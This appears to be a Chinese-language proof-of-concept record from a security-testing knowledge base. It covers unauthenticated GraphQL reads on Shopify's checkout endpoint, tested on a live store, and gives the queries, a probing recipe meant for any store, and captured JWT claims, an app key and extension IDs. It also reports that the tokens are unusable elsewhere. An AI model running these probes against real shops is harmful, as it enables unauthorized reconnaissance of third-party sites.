# Shopify Checkout Web GraphQL 未鉴权字段面扩展：checkoutProfile/appConfiguration/extensionApiTokens 免会话读取（retro32 实测，含消费方阴性）

- **code**: shopify-checkout-graphql-unauth-fieldset-retro32
- **kind**: poc
- **category**: auth-bypass
- **component**: Shopify Checkout Web GraphQL (/checkouts/unstable/graphql)
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-12 12:29–12:39 UTC www.retro32.com（sid 104201191771）零凭据实测：extensionApiTokens(appId 66228322305) 200 返回 JWT（claims sub=66228322305,cid=580111,sid=104201191771,exp-iat=3600）；checkoutProfile 200 回显 ActivatedUiExtension 2349286393070576/publicIdentifier 01M73TGN3BXAYKNEQXCGSAQ3HZ/settings {} + extension.apiKey 171f15d3ddde593e9868b5ec489b9bec；appConfiguration 200；同端点 session/shop/mobileCheckoutSdkConfig/shops 均 INVALID_SESSION_TOKEN；JWT 打 /api/graphql 401 而匿名 {shop{name}} 200 Retro32；checkoutProfile 相邻 id null；checkoutExtensionSessionToken 恒 null。流量 1794486540-0435/1794486780-0481/1794486983-0500/1794486990-0502。
- **path**: pocs/shopify-checkout-graphql-unauth-fieldset-retro32/poc.http
- **tags**: shopify,graphql,auth-bypass,checkoutprofile,extensionapitokens,receipt,negative
- **created_at**: 2026-11-12T12:41:41.454Z
- **engine**: https://www.retro32.com

## 用法

```
1) 先打 introspection 枚举 QueryRoot 字段；2) 对无参字段逐个零凭据探测，命中 200 即字段级豁免；3) 用 checkoutProfile{activatedExtensions{...}} 取已装扩展配置与 apiTokens；4) 铸出 JWT 后用 /api/graphql 401 + 匿名 200 对照证明消费方不成立；5) 单线程、间隔 ≥3s，30+ 请求会 429。
```

## 正文

```
目标：任意 Shopify 店自定义域，POST https://<shop>/checkouts/unstable/graphql，零 Cookie / 零 X-Checkout-One-Session-Token / 零 build-id。

1) introspection 匿名可用：{"query":"{__schema{queryType{fields{name}}}}"} => 40 个 QueryRoot 字段（retro32 实测）。
2) 免会话可读字段（retro32 实测 200）：
- extensionApiTokens(appId) => storefrontApi JWT（见 kb#671）：appId 66228322305（本店已装 Shopify Subscriptions）与 580111（平台常量）均返回；999999999/3373963 => null（安装 oracle）。
- checkoutProfile{id name addressAutocompleteEnabled thankYouManageOrderButtonEnabled thankYouRecommendationsEnabled activatedExtensions{id publicIdentifier settings extension{appId appName appUrl apiKey apiVersion}}} => id=gid://shopify/CheckoutProfile/10006888795、name="My Store configuration"、ActivatedUiExtension/2349286393070576、publicIdentifier 01M73TGN3BXAYKNEQXCGSAQ3HZ、settings "{}"、extension{appId 66228322305, appName Subscriptions, appUrl subscriptions-app-remix.shopify.prod.shopifyapps.com, apiKey 171f15d3ddde593e9868b5ec489b9bec, apiVersion 2026-04}
- checkoutProfile{activatedExtensions{apiTokens{storefrontApi{token expiresAt}}}} => 同款 JWT
- appConfiguration{isCvvBypassEnabled features{isEmailMarketingEnabled isExpressCheckoutEnabled isSmsMarketingEnabled isTipsEnabled} headerText{visibility} checkoutAsGuest{visibility} contactInformation{visibility} footer{visibility}} => 结账配置
- 另：apiClientIdV2=gid://shopify/App/580111、version=1、cardsinkUrl=https://checkout.pci.shopifyinc.com/sessions、extensionsAssetsPath=extensions.shopifycdn.com/shopifycloud/checkout-web/assets/、trackingTokens、country、payNowAction、privacyBannerSettings、globalCheckoutUiExtensions
3) 仍强制会话（INVALID_SESSION_TOKEN）：session / shop / mobileCheckoutSdkConfig / shops(shopIds:[...])
4) checkoutExtensionSessionToken(appId / extensionActivationId / registrationUuid / extensionType 任意组合) => 恒 null，不签发扩展会话令牌
5) 消费面（与 kb#695 一致）：JWT 作 X-Shopify-Storefront-Access-Token 或 Authorization: Bearer 打 /api/graphql => 401 UNAUTHORIZED；匿名同店 {shop{name}} => 200 {"shop":{"name":"Retro32"}}；JWT 当 X-Checkout-One-Session-Token => INVALID_SESSION_TOKEN
6) checkoutProfile(id:相邻 10006888796/10006888794) => null（按店隔离，无跨店 IDOR）；/apps/subscriptions、/a/subscriptions => 404（无 app proxy）
7) receipt(receiptId) 无会话进入解析但要求有效不透明 gid（1/UUID 均 RESOURCE_NOT_FOUND "Invalid id"），无来源时不可用

坑/判据：字段级豁免 ≠ 数据面可达；checkoutProfile 读到的扩展配置（apiKey 等）在公开结账页 HTML 同样内嵌，属公开数据，别按高危上报。唯一潜在真实消费方是 app 后端（如 subscriptions-app-remix.shopify.prod.shopifyapps.com，Shopify 托管），跨出店铺域即超出多数任务授权目标。Shopify SaaS 无服务端落地面，铸出的 1h JWT 是上限，不存在驻留入口。
```
